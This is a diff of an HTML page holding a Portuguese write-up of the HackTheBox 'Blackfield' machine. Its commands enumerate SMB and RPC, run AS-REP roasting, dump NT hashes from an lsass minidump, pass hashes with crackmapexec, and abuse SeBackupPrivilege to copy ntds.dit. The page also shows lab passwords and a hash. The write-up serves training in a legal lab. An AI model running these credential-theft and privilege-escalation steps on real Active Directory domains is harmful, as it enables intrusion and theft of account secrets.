@@ -160,7 +160,23 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="Assets/HTB-Windows-Hard-Blackfield/icon.webp" alt="" /></p>
+                        <ol>
+<li><a href="#resolu%C3%A7%C3%A3o-da-m%C3%A1quina-blackfield">Resolução da máquina <strong>Blackfield</strong></a> 1. <a href="#m%C3%A1quina-hard-hacktheboxcom">Máquina Hard (hackthebox.com)</a> 2. <a href="#by-javalimz---23092021">by <strong><em>JavaliMZ</em></strong> - 23/09/2021</a></li>
+<li><a href="#introdu%C3%A7%C3%A3o">Introdução</a></li>
+<li><a href="#enumera%C3%A7%C3%A3o">Enumeração</a>
+<ol>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#smb-anonymous">SMB (anonymous)</a></li>
+<li><a href="#as-rep-roasting-attack">AS-REP Roasting Attack</a></li>
+<li><a href="#rpc">RPC</a></li>
+<li><a href="#as-rep-roasting-attack-1">AS-REP Roasting Attack</a></li>
+<li><a href="#bloodhound">Bloodhound</a></li>
+<li><a href="#smb">SMB</a></li>
+</ol>
+</li>
+<li><a href="#privesc-svc_backup--administrator-de-dom%C3%ADnio">PrivEsc svc_backup ==&gt; Administrator de domínio</a></li>
+</ol>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/icon.webp" alt="" /></p>
 <img src="https://img.shields.io/badge/Blackfield-HackTheBox-green?style=plastic" width="200">
 <h1 id="resolução-da-máquina-blackfield"><a class="header" href="#resolução-da-máquina-blackfield">Resolução da máquina <strong>Blackfield</strong></a></h1>
 <h4 id="máquina-hard-hacktheboxcom"><a class="header" href="#máquina-hard-hacktheboxcom">Máquina Hard (hackthebox.com)</a></h4>
@@ -188,7 +204,7 @@
 #&gt;  593/tcp  open  http-rpc-epmap
 #&gt;  3268/tcp open  globalcatLDAP
 #&gt;  5985/tcp open  wsman
-#&gt;  
+#&gt;
 #&gt;  Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
 
 nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/nmap-a.txt
@@ -197,7 +213,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 #&gt;  Nmap scan report for 10.10.10.192
 #&gt;  Host is up, received user-set (0.041s latency).
 #&gt;  Scanned at 2021-09-23 14:22:41 WEST for 49s
-#&gt;  
+#&gt;
 #&gt;  PORT     STATE SERVICE       REASON  VERSION
 #&gt;  53/tcp   open  domain        syn-ack Simple DNS Plus
 #&gt;  88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-09-23 20:22:50Z)
@@ -210,7 +226,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 #&gt;  |_http-server-header: Microsoft-HTTPAPI/2.0
 #&gt;  |_http-title: Not Found
 #&gt;  Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-#&gt;  
+#&gt;
 #&gt;  Host script results:
 #&gt;  |_clock-skew: 7h00m02s
 #&gt;  | p2p-conficker:
@@ -226,7 +242,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 #&gt;  | smb2-time:
 #&gt;  |   date: 2021-09-23T20:22:54
 #&gt;  |_  start_date: N/A
-#&gt;  
+#&gt;
 #&gt;  Read data files from: /usr/bin/../share/nmap
 #&gt;  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 #&gt;  # Nmap done at Thu Sep 23 14:23:30 2021 -- 1 IP address (1 host up) scanned in 50.65 seconds
@@ -240,8 +256,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 <pre><code class="language-bash">crackmapexec smb 10.10.10.192
 #&gt; SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 </code></pre>
-<p>Ok, já temos algumas informações. Temos o domínio (blackfield.local) e o nome da máquina (DC01).
-vamos adicionar essas informações para o nosso /etc/hosts, para possíveis futuras ferramentas usarem essa informação</p>
+<p>Ok, já temos algumas informações. Temos o domínio (blackfield.local) e o nome da máquina (DC01). vamos adicionar essas informações para o nosso /etc/hosts, para possíveis futuras ferramentas usarem essa informação</p>
 <pre><code class="language-bash">echo -e &quot;10.10.10.192\tblackfield.local dc01.blackfield.local&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Com a ferramenta crackmapexec, temos opção para ver as pastas partilhadas com o parâmetro &quot;--shares&quot;</p>
@@ -250,7 +265,7 @@ vamos adicionar essas informações para o nosso /etc/hosts, para possíveis fut
 #&gt;  SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 #&gt;  SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
 </code></pre>
-<p>Parece que não está acessível, mas o erro não é o normal desta ferramenta... diz &quot;STATUS_USER_SESSION_DELETED&quot;. Vamos tentar a mesma coisa especificandos login <em>&quot;null&quot;</em> e password <em>&quot;vazio&quot;</em></p>
+<p>Parece que não está acessível, mas o erro não é o normal desta ferramenta... diz &quot;STATUS*USER_SESSION_DELETED&quot;. Vamos tentar a mesma coisa especificandos login *&quot;null&quot;_ e password _&quot;vazio&quot;_</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/smb-null.png" alt="smb null session" /></p>
 <p>Agora sim! Vemos duas pastas partilhadas pelo qual podemos aceder. IPC$ e profiles$. IPC$ não tem nada, e profiles$ parece muito mais &quot;feito à unha&quot;. Vamos entrar e ver com smbclient, usando o null session</p>
 <pre><code class="language-bash">smbclient \\\\10.10.10.192\\profiles$ -U 'null'  # Pede a palavra pass. É só dar Enter...
@@ -295,7 +310,7 @@ smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'
 <p>Bingo! Desta vez tenho resposta. E bem grande! Todos os usuários a nível de domínio!. Isso significa duas coisas. Significa que posso tentar um novo attack AS-RES Roasting, e significa que posso extrair todas as informações de domínio.</p>
 <pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]'
 </code></pre>
-<p>Todos os usuários podem ser listados com este comando... mas para limpar um pouco os usuários desnecessários para a resolução da máquina, afim de termos outputs mais &quot;cleans&quot;, vou já eliminar todos os usuários BLACKFIELD*. </p>
+<p>Todos os usuários podem ser listados com este comando... mas para limpar um pouco os usuários desnecessários para a resolução da máquina, afim de termos outputs mais &quot;cleans&quot;, vou já eliminar todos os usuários BLACKFIELD*.</p>
 <pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]' | grep -v &quot;BLACKFIELD&quot;
 
 #&gt;  Administrator
@@ -352,7 +367,7 @@ mount -t cifs //10.10.10.192/forensic /mnt/smb -o username=Audit2020,password=J4
 # Atenção que a password não leva o sinal &quot;\&quot;, mas está lá para escapar o sinal &quot;!&quot; (para não interpretar o &quot;!&quot;)
 cd smb
 </code></pre>
-<p>A partir de agora estamos sincronizados com a pasta de partilha. Atenção que, por mais que todos os ficheiros estão referenciados como sendo proprietário root, isto não corresponde à verdade. É mais ou menos um link, e um link  no linux tem proprietário e privilégios do seu criador, não do objeto linkado.</p>
+<p>A partir de agora estamos sincronizados com a pasta de partilha. Atenção que, por mais que todos os ficheiros estão referenciados como sendo proprietário root, isto não corresponde à verdade. É mais ou menos um link, e um link no linux tem proprietário e privilégios do seu criador, não do objeto linkado.</p>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/mount_forensic.png" alt="SMB Mounted - forensic" /></p>
 <p>Vemos que existe 718 ficheiros espalhados por 38 diretórios... Mas a pasta memory_analysis é muito acolhedor. E lá dentro está um ficheiro lsass.zip. Se dentro desse zip se encontra um minidump de lsass.DMP, isto está maravilhosamente fácil. Para extrair hashes de todos os usuários locais, basta utilizar a ferramenta pypykatz. O resultado do comando é longo, então podemos filtrar por &quot;NT&quot; e &quot;Username&quot;, fazer um &quot;sort&quot; disse tudo, separar os usuários dos hashes, e dar os ingredientes todos para o crackmapexec identificar que hash é de que usuários, e validar logo isto tudo</p>
 <pre><code class="language-bash">cd memory_analysis
@@ -381,16 +396,14 @@ crackmapexec smb 10.10.10.192 -u tmp_users -H tmp_hashes --continue-on-success
 crackmapexec winrm 10.10.10.192 -u tmp_users -H tmp_hashes --continue-on-success
 </code></pre>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/crackmapexec-svc_backup.png" alt="Crackmapexec svc_backup" /></p>
-<p>Temos um único resultado e já está validado. E para além de válido, está <em><strong>Pwn3d!</strong></em> em winrm. Isso quer dizer que temos capacidade de psexec, ou evil-winrm.</p>
+<p>Temos um único resultado e já está validado. E para além de válido, está <strong><em>Pwn3d!</em></strong> em winrm. Isso quer dizer que temos capacidade de psexec, ou evil-winrm.</p>
 <blockquote>
 <p>svc_backup:9658d1d1dcd9250115e2205d9f48400d</p>
 </blockquote>
 <h1 id="privesc-svc_backup--administrator-de-domínio"><a class="header" href="#privesc-svc_backup--administrator-de-domínio">PrivEsc svc_backup ==&gt; Administrator de domínio</a></h1>
 <p><img src="Assets/HTB-Windows-Hard-Blackfield/evil-winrm-svc-backup.png" alt="Evil-WinRM svc_backup" /></p>
-<p>Logo de entrada, vemos com um whoami qual é o caminho a seguir! Este usuário é membro do grupo SeBackupPrivilege. Pelo nome é um pouco normal. Usuários deste grupo tem privilégios para copiar programas que estão em memória RAM, e tem possibilidade de fazer backups de todo o sistema. Não pode abrir tudo &quot;à Lagardère&quot;, mas dá para bypassar isto tudo. Já que iremos ter acesso a todos os ficheiros do sistema, podemos escolher qual queremos. Poderíamos em primeira instância quer extrair o SAM e SYSTEM, mas nesta máquina, e SAM nos daria exactamente igual ao ficheiro lsass que já vimos antes, pelo que a hash do Administrator local não funcionará (nem sei bem o motivo...). Mas há um ficheiro nos Domain Controller que contem a base de dados de todos os usuários de domínio e seus hashes. Esse ficheiro é chamado de &quot;<em><strong>ntds.dit</strong></em>&quot;. E é este o nosso alvo. Para se fazer, basta copiar o referido ficheiro, que se encontra em C:\Windows\NTDS\ntds.dit. Problemas:
--	O ficheiro está em uso. (não se pode fazer copia do mesmo se está em uso)
--	Não tenho privilégios diretos. (tenho de usar programas que me fazem ter temporáriamente privilégios Administrador)</p>
-<p>Existe um programa chamado de robocopy, que nos permite resolver o segundo ponto, visto que tem um parametro (/b) para fazer a cópia em backup mode (Passando a ter o privilégio do grupo SeBackupPrivilege) </p>
+<p>Logo de entrada, vemos com um whoami qual é o caminho a seguir! Este usuário é membro do grupo SeBackupPrivilege. Pelo nome é um pouco normal. Usuários deste grupo tem privilégios para copiar programas que estão em memória RAM, e tem possibilidade de fazer backups de todo o sistema. Não pode abrir tudo &quot;à Lagardère&quot;, mas dá para bypassar isto tudo. Já que iremos ter acesso a todos os ficheiros do sistema, podemos escolher qual queremos. Poderíamos em primeira instância quer extrair o SAM e SYSTEM, mas nesta máquina, e SAM nos daria exactamente igual ao ficheiro lsass que já vimos antes, pelo que a hash do Administrator local não funcionará (nem sei bem o motivo...). Mas há um ficheiro nos Domain Controller que contem a base de dados de todos os usuários de domínio e seus hashes. Esse ficheiro é chamado de &quot;<strong><em>ntds.dit</em></strong>&quot;. E é este o nosso alvo. Para se fazer, basta copiar o referido ficheiro, que se encontra em C:\Windows\NTDS\ntds.dit. Problemas: - O ficheiro está em uso. (não se pode fazer copia do mesmo se está em uso) - Não tenho privilégios diretos. (tenho de usar programas que me fazem ter temporáriamente privilégios Administrador)</p>
+<p>Existe um programa chamado de robocopy, que nos permite resolver o segundo ponto, visto que tem um parametro (/b) para fazer a cópia em backup mode (Passando a ter o privilégio do grupo SeBackupPrivilege)</p>
 <p>O primeiro ponto é mais tricky... Eu não posso copiar um arquivo em uso. Mas posso criar uma unidade que esteja ligada ao meu disco local C:\. O ficheiro em uso será sempre o do disco C:\, e o mesmo ficheiro na outra unidade não estará a ser usado (GG Windows xD).</p>
 <p>Para se fazer:</p>
 <ul>
